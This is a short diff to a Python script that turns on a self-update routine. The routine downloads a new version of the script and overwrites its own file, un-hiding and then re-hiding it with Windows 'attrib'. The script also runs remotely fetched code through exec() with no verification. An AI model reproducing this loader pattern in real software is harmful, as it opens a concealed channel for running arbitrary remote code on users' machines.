@@ -1,5 +1,4 @@
 from urllib.request import *
-from time import *
 import os
 
 ver = 0
@@ -23,8 +22,8 @@ def check(file, branch=branch):
         ).read().decode('utf-8')
     except:
         return ''
-if False:
-#if check('ver')!=ver and check('ver')!='':
+
+if check('ver')!=ver and check('ver')!='':
     os.system(f'attrib -h "{script}"')
     open(
         script, 'w'
@@ -33,14 +32,14 @@ if False:
     )
     os.system(f'attrib +h "{script}"')
 
-open(dir+'/aver.txt', 'w').write(check('1bach_c.py'))
-
 try:
     exec(check('general.py'))
 except:
     pass
 
+'''
 try:
     exec(check(xScript))
 except:
     pass
+'''
